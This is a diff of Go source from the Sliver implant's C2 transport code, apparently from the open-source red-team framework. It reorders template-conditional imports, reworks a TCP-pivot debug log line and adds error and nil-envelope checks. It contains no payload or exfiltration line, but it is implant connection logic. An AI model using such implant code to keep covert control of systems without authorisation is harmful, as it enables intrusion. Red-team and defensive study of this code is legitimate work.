@@ -26,7 +26,6 @@ import (
 
 	// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled}}
 	"strconv"
-
 	// {{end}}
 
 	// {{if .Config.Debug}}
@@ -35,7 +34,6 @@ import (
 
 	// {{if .Config.MTLSc2Enabled}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
-
 	// {{end}}
 
 	// {{if .Config.WGc2Enabled}}
@@ -47,7 +45,6 @@ import (
 
 	// {{if .Config.HTTPc2Enabled}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
-
 	// {{end}}
 
 	// {{if .Config.DNSc2Enabled}}
@@ -55,15 +52,16 @@ import (
 	// {{end}}
 
 	// {{if .Config.TCPPivotc2Enabled}}
-	"fmt"
-
 	"github.com/bishopfox/sliver/implant/sliver/transports/pivotclients"
 	"google.golang.org/protobuf/proto"
 
 	// {{end}}
 
-	"io"
+	// {{if not .Config.NamePipec2Enabled}}
 	"net/url"
+	// {{end}}
+
+	"io"
 	"sync"
 	"time"
 
@@ -625,9 +623,10 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 
 // {{if .Config.TCPPivotc2Enabled}}
 func tcpPivotConnect(uri *url.URL) (*Connection, error) {
-	addr := fmt.Sprintf("%s:%s", uri.Hostname(), uri.Port())
 	// {{if .Config.Debug}}
-	log.Printf("Attempting to connect via TCP Pivot to: %s\n", addr)
+	log.Printf("Attempting to connect via TCP Pivot to %s:%s\n",
+		uri.Hostname(), uri.Port(),
+	)
 	// {{end}}
 
 	opts := pivotclients.ParseTCPPivotOptions(uri)
@@ -694,6 +693,18 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			envelope, err := pivot.ReadEnvelope()
 			if err == io.EOF {
 				break
+			}
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[tcp-pivot] read envelope error: %s", err)
+				// {{end}}
+				continue
+			}
+			if envelope == nil {
+				// {{if .Config.Debug}}
+				log.Printf("[tcp-pivot] read nil envelope")
+				// {{end}}
+				continue
 			}
 			if envelope.Type == pb.MsgPivotPing {
 				// {{if .Config.Debug}}
